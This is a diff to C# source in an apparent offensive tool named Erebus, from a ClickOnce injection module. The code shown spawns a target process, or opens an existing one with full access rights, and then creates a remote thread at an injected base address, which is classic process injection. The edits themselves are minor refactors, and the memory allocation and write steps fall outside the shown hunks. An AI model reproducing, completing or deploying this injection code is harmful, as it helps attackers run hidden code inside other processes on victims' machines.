@@ -1,7 +1,6 @@
-using System;
-using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Runtime.Versioning;
+using System.Text;
 
 namespace Erebus.ClickOnce.Injections
 {
@@ -30,10 +29,11 @@ namespace Erebus.ClickOnce.Injections
                     Win32.STARTUPINFO si = new Win32.STARTUPINFO();
                     si.cb = Marshal.SizeOf(si);
                     Win32.PROCESS_INFORMATION pi;
+                    StringBuilder cmdLine = new StringBuilder(InjectionConfig.TargetProcess);
 
                     bool success = Win32.CreateProcess(
                         null!,
-                        InjectionConfig.TargetProcess,
+                        cmdLine,
                         IntPtr.Zero,
                         IntPtr.Zero,
                         false,
@@ -51,13 +51,17 @@ namespace Erebus.ClickOnce.Injections
 
                     hProcess = pi.hProcess;
                     pid = pi.dwProcessId;
+
+                    // Close the main thread handle as we don't need it right now
                     Win32.CloseHandle(pi.hThread);
+
                     DebugLogger.WriteLine($"[+] Target process created with PID: {pid}");
                 }
                 else
                 {
                     DebugLogger.WriteLine($"[+] Opening target process PID: {targetPid}");
                     hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetPid);
+
                     if (hProcess == IntPtr.Zero)
                     {
                         DebugLogger.WriteLine($"[-] Failed to open process: {Marshal.GetLastWin32Error()}");
@@ -115,7 +119,7 @@ namespace Erebus.ClickOnce.Injections
                         (Win32.HANDLE)hProcess,
                         null,
                         0,
-                        (Win32.LPTHREAD_START_ROUTINE)Marshal.GetDelegateForFunctionPointer(baseAddress, typeof(Win32.LPTHREAD_START_ROUTINE)),
+                        baseAddress,
                         null,
                         Win32.THREAD_CREATION_FLAGS.THREAD_CREATE_RUN_IMMEDIATELY,
                         null);
